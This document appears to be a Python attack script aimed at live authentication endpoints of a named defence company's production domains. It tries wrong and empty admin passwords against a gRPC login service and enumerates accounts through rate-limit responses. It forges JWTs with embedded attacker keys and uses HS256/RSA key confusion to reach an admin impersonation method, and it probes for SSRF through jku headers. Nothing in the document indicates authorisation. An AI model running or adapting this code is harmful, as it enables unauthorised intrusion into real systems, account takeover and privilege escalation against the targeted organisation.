#!/usr/bin/env python3
"""
CRITICAL FOLLOW-UP INVESTIGATIONS:

1. LoginPassword returns grpc-status:0 with WRONG passwords → possible auth bypass?
   Need to decode response body to see if there's an actual token

2. local_rate_limited [14] for admin/operator accounts → user enumeration confirmed
   These accounts EXIST and have been previously targeted

3. Full jwk injection error → "invalid embedded jwk, must b..." (truncated)
   What key types ARE allowed? RSA? Let's inject RS256 jwk

4. Different error for different JWTs = different code paths revealed
"""
import requests, json, struct, base64, hmac, hashlib, time, statistics
import urllib.parse, re
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
S = requests.Session()
S.verify = False

def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b|0x80]) if v else bytes([b])
        if not v: break
    return r
def ps(fn, s): v = s.encode(); return _vi((fn<<3)|2)+_vi(len(v))+v
def pb(fn, b): return _vi((fn<<3)|2)+_vi(len(b))+b
def pvi(fn, v): return _vi((fn<<3)|0)+_vi(v)
def gf(b): return b"\x00" + struct.pack(">I", len(b)) + b

def parse_grpc_full(data):
    """Full gRPC frame parsing with detailed output"""
    frames = []
    i = 0
    while i < len(data):
        if i + 5 > len(data): break
        ftype = data[i]
        length = struct.unpack(">I", data[i+1:i+5])[0]
        body = data[i+5:i+5+length]
        frames.append((ftype, body))
        i += 5 + length
    return frames

def grpc_full(host, svc, method, body=b"", auth=None, timeout=8):
    """Full gRPC call with complete response analysis"""
    hdr = {
        "User-Agent": UA,
        "Content-Type": "application/grpc-web+proto",
        "Accept": "application/grpc-web+proto",
        "X-Grpc-Web": "1",
    }
    if auth:
        hdr["Authorization"] = auth
    r = S.post(f"{host}/{svc}/{method}", data=gf(body) if body else b"", 
               headers=hdr, timeout=timeout, verify=False)
    
    result = {
        "http_status": r.status_code,
        "headers": dict(r.headers),
        "raw": r.content,
        "grpc_status": r.headers.get('grpc-status', ''),
        "grpc_message": r.headers.get('grpc-message', ''),
        "frames": [],
        "response_body": b"",
        "trailer": {}
    }
    
    frames = parse_grpc_full(r.content)
    for ftype, fbody in frames:
        frame_info = {"type": ftype, "length": len(fbody), "raw": fbody}
        if ftype == 0x80:  # trailer frame
            trailer_text = fbody.decode('utf-8', errors='replace')
            for line in trailer_text.strip().split('\r\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    result["trailer"][k.strip().lower()] = v.strip()
                    if k.strip().lower() == 'grpc-status':
                        result["grpc_status"] = result["grpc_status"] or v.strip()
                    if k.strip().lower() == 'grpc-message':
                        result["grpc_message"] = result["grpc_message"] or v.strip()
        elif ftype == 0x00:  # data frame
            result["response_body"] = fbody
        result["frames"].append(frame_info)
    
    return result

catalog = "https://catalog.anduril.com"
pg = "https://proving-ground.anduril.com"

print("=" * 70)
print("1. DECODE LoginPassword STATUS=0 RESPONSES (auth bypass investigation)")
print("=" * 70)
print("Status 0 = gRPC OK → need to check if response body has a token!\n")

SVC_IDP = "anduril.auth.v2.InternalIdp"
METHOD_IDP = "LoginPassword"

def make_login_req(username, password):
    return ps(1, username) + ps(2, password)

# Test users that returned status 0 earlier
test_cases = [
    ("admin@anduril.com", "wrongpassword123"),
    ("admin@anduril.com", "password"),
    ("admin@anduril.com", ""),  # empty password!
    ("test@anduril.com", "wrongpassword123"),
    ("sysadmin@anduril.com", "wrongpassword123"),
    ("admin@proving-ground.anduril.com", "wrongpassword123"),
    ("admin@proving-ground.anduril.com", ""),  # empty password!
    ("lattice@anduril.com", "wrongpassword123"),
    # Also test on catalog
    ("admin@anduril.com", "wrongpassword123"),
]

print("  Testing on proving-ground:")
for username, password in test_cases[:8]:
    body = make_login_req(username, password)
    result = grpc_full(pg, SVC_IDP, METHOD_IDP, body=body)
    gs = result['grpc_status']
    gm = result['grpc_message']
    resp_body = result['response_body']
    print(f"\n  user={username}, pass='{password}':")
    print(f"    HTTP={result['http_status']}, grpc-status={gs}")
    print(f"    grpc-message={gm[:200]}")
    print(f"    trailer={result['trailer']}")
    if resp_body:
        print(f"    response_body (hex): {resp_body.hex()}")
        print(f"    response_body (text): {resp_body.decode('utf-8', errors='replace')[:200]}")
        # Try to parse as protobuf: look for string fields
        print(f"    Trying to decode as protobuf...")
        i = 0
        while i < len(resp_body):
            try:
                tag = resp_body[i]
                wire_type = tag & 0x7
                field_num = tag >> 3
                i += 1
                if wire_type == 2:  # length-delimited
                    length = resp_body[i]
                    i += 1
                    val = resp_body[i:i+length]
                    i += length
                    print(f"      field {field_num}: {val[:100]}")
                elif wire_type == 0:  # varint
                    val = 0
                    shift = 0
                    while i < len(resp_body):
                        b = resp_body[i]; i += 1
                        val |= (b & 0x7F) << shift
                        if not (b & 0x80): break
                        shift += 7
                    print(f"      field {field_num} (int): {val}")
                else:
                    i += 1
            except:
                break
    else:
        print(f"    response_body: EMPTY")
    
    frames_info = [(f["type"], f["length"]) for f in result["frames"]]
    print(f"    frames: {frames_info}")
    print(f"    raw ({len(result['raw'])}b): {result['raw'].hex()[:100]}")

print("\n\n" + "=" * 70)
print("2. TESTING ON CATALOG - Does LoginPassword work differently there?")
print("=" * 70)

# Test on catalog
for username, password in [("admin@anduril.com", "wrongpassword123"), ("admin@anduril.com", "")]:
    body = make_login_req(username, password)
    result = grpc_full(catalog, SVC_IDP, METHOD_IDP, body=body)
    print(f"\n  catalog: user={username}, pass='{password}':")
    print(f"    HTTP={result['http_status']}, grpc-status={result['grpc_status']}")
    print(f"    grpc-message={result['grpc_message'][:200]}")
    if result['response_body']:
        print(f"    response: {result['response_body'].hex()}")

print("\n\n" + "=" * 70)
print("3. FULL jwk INJECTION ERROR - what types ARE allowed?")
print("=" * 70)

# Get full error for oct key injection
our_secret = b"our_injected_key_12345"
our_k = base64.urlsafe_b64encode(our_secret).rstrip(b'=').decode()

payload = {"sub": "admin@anduril.com", "iss": "https://anduril.okta.com", "exp": 9999999999, "iat": 1700000000}

def make_jwt_custom_header(header_dict, payload_dict, secret_bytes):
    h = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
    msg = f"{h}.{p}"
    sig = hmac.new(secret_bytes, msg.encode(), hashlib.sha256).digest()
    return f"{msg}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

def make_rs256_jwt_embedded(header_extra, payload_dict, private_key):
    """RS256 JWT with extra header fields, signed with private key"""
    header_dict = {"alg": "RS256", "typ": "JWT"}
    header_dict.update(header_extra)
    h = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
    msg = f"{h}.{p}"
    sig = private_key.sign(msg.encode(), padding.PKCS1v15(), hashes.SHA256())
    return f"{msg}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

SVC = "anduril.auth.v2.InsecureAuthAdmin"
METHOD = "ImpersonateTestPermissions"

# Test: jwk with oct key - get full error
jwk_oct_header = {"alg": "HS256", "typ": "JWT", "jwk": {"kty": "oct", "k": our_k, "alg": "HS256"}}
jwt = make_jwt_custom_header(jwk_oct_header, payload, our_secret)
result = grpc_full(catalog, SVC, METHOD, auth=f"Bearer {jwt}")
print(f"\n  jwk oct injection FULL response:")
print(f"  grpc-message: {result['grpc_message']}")
print(f"  raw: {result['raw'].hex()[:200]}")

# Generate our own RSA key pair and try RSA jwk injection
print("\n  Generating RSA key pair for jwk injection...")
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Convert public key to JWK
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import math

pub_numbers = public_key.public_key().public_numbers() if hasattr(public_key, 'public_key') else public_key.public_numbers()
n = pub_numbers.n
e = pub_numbers.e

def int_to_base64url(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode()

our_jwk = {
    "kty": "RSA",
    "alg": "RS256",
    "use": "sig",
    "n": int_to_base64url(n),
    "e": int_to_base64url(e),
    "kid": "attacker-key-1"
}

# Attack: RS256 JWT with embedded jwk using our key
header_with_jwk = {"kid": "attacker-key-1", "jwk": our_jwk}
jwt_rs256_embedded = make_rs256_jwt_embedded(header_with_jwk, payload, private_key)
result = grpc_full(catalog, SVC, METHOD, auth=f"Bearer {jwt_rs256_embedded}")
print(f"\n  RS256 JWT + embedded RSA jwk (our key):")
print(f"  grpc-status: {result['grpc_status']}")  
print(f"  grpc-message: {result['grpc_message'][:300]}")
print(f"  HTTP: {result['http_status']}")

# What if we sign with our RSA key but set alg=HS256 and embed the public key as jwk?
# Hybrid attack: HS256 alg but RSA jwk embedded
hybrid_header = {"alg": "HS256", "typ": "JWT", "kid": "attacker-key-1", "jwk": our_jwk}
# We need to sign with HS256 but using what key? Our RSA PEM as bytes
pem_bytes = public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
jwt_hybrid = make_jwt_custom_header(hybrid_header, payload, pem_bytes)
result = grpc_full(catalog, SVC, METHOD, auth=f"Bearer {jwt_hybrid}")
print(f"\n  HYBRID: HS256 alg + RSA jwk header, signed with RSA PEM as HMAC key:")
print(f"  grpc-status: {result['grpc_status']}")  
print(f"  grpc-message: {result['grpc_message'][:300]}")

print("\n\n" + "=" * 70)
print("4. DETAILED 'local_rate_limited' ANALYSIS - USER ENUMERATION")
print("=" * 70)
print("STATUS 14 = UNAVAILABLE in gRPC. 'local_rate_limited' = account rate limited")
print("This means these accounts EXIST and have hit a per-account rate limit\n")

# The accounts that were rate limited: admin@anduril.com IS rate limited on GetSSOURL
# but on LoginPassword, some returned [0]...
# Let me test more carefully with all methods

# Test accounts more carefully 
extended_users = [
    "admin@anduril.com",
    "admin@proving-ground.anduril.com",
    "operator@anduril.com",  
    "operator@proving-ground.anduril.com",
    "lattice@proving-ground.anduril.com",
    "system@proving-ground.anduril.com",
    "superadmin@anduril.com",
    "supervisor@proving-ground.anduril.com",
    "commander@proving-ground.anduril.com",
    "service@proving-ground.anduril.com",
    "lattice-service@proving-ground.anduril.com",
]

print("  Testing InternalIdp/LoginPassword on proving-ground:")
rate_limited_accounts = []
success_accounts = []
for username in extended_users:
    body = make_login_req(username, "wrongpassword_xyz_123")
    result = grpc_full(pg, SVC_IDP, METHOD_IDP, body=body)
    gs = result['grpc_status']
    gm = result['grpc_message'][:80]
    if gs == '14':
        rate_limited_accounts.append(username)
        print(f"  [RATE LIMITED - VALID USER] {username}: [{gs}] {gm}")
    elif gs == '0' and result['response_body']:
        success_accounts.append((username, result['response_body']))
        print(f"  [SUCCESS?!] {username}: body={result['response_body'].hex()}")
    else:
        print(f"  {username}: [{gs}] {gm}")

print(f"\n  RATE LIMITED (valid) accounts: {rate_limited_accounts}")
print(f"  SUCCESS accounts: {success_accounts}")

print("\n\n" + "=" * 70)
print("5. PROBE anduril.auth.v2.InternalIdp ON CATALOG (not just proving-ground)")
print("=" * 70)

# Test what methods InternalIdp has on catalog
idp_methods = ["LoginPassword", "LoginSAML", "GetSSOURL", "CreateUser", "ListUsers",
               "GetUser", "DeleteUser", "UpdatePassword", "ListSessions", "CreateSession"]

print("  Testing InternalIdp methods on catalog:")
for method in idp_methods:
    result = grpc_full(catalog, "anduril.auth.v2.InternalIdp", method)
    gs = result['grpc_status']
    gm = result['grpc_message'][:100]
    if "unknown" not in gm.lower():
        print(f"  [ACCESSIBLE] {method}: [{gs}] {gm}")
    else:
        print(f"  [unknown] {method}")

print("\n  Testing on proving-ground:")
for method in idp_methods:
    result = grpc_full(pg, "anduril.auth.v2.InternalIdp", method)
    gs = result['grpc_status']
    gm = result['grpc_message'][:100]
    if "unknown method" not in gm.lower():
        print(f"  [ACCESSIBLE] {method}: [{gs}] {gm}")
    else:
        print(f"  [unknown] {method}")

print("\n\n" + "=" * 70)
print("6. EXPLOIT: jku INJECTION with SSRF timing analysis")  
print("=" * 70)
print("jku may trigger outbound HTTP; measure response times to confirm SSRF")

# The jku approach: set jku to a target that varies response time
# If server tries to fetch jku URL, we'll see slower response time
# Test with unreachable internal IP vs reachable external URL

import time

def test_jku_timing(target_url, trials=3):
    timings = []
    for _ in range(trials):
        header = {"alg": "HS256", "typ": "JWT", "jku": target_url}
        jwt = make_jwt_custom_header(header, payload, b"test")
        start = time.time()
        result = grpc_full(catalog, SVC, METHOD, auth=f"Bearer {jwt}")
        elapsed = time.time() - start
        timings.append(elapsed)
    return timings, result['grpc_message']

# Baseline (no jku)
baseline_header = {"alg": "HS256", "typ": "JWT"}
times_base = []
for _ in range(3):
    jwt = make_jwt_custom_header(baseline_header, payload, b"test")
    start = time.time()
    grpc_full(catalog, SVC, METHOD, auth=f"Bearer {jwt}")
    times_base.append(time.time() - start)
print(f"\n  Baseline (no jku): {[f'{t:.3f}' for t in times_base]} → avg: {sum(times_base)/len(times_base):.3f}s")

# Internal IP that would timeout (SSRF probe)
t1, msg1 = test_jku_timing("http://10.0.0.1:80/jwks.json")
print(f"  jku=http://10.0.0.1/.../jwks.json: {[f'{t:.3f}' for t in t1]} → avg: {sum(t1)/len(t1):.3f}s")

# Non-routable IP (instant timeout)  
t2, msg2 = test_jku_timing("http://192.168.1.1/jwks.json")
print(f"  jku=http://192.168.1.1/jwks.json: {[f'{t:.3f}' for t in t2]} → avg: {sum(t2)/len(t2):.3f}s")

print(f"\n  Messages: {msg1[:100]} / {msg2[:100]}")

if sum(t1)/len(t1) > sum(times_base)/len(times_base) * 2:
    print("  [SSRF CONFIRMED] jku URL is being fetched! Longer response time!")
else:
    print("  jku appears NOT fetched (no significant timing difference)")

print("\n[DONE]")
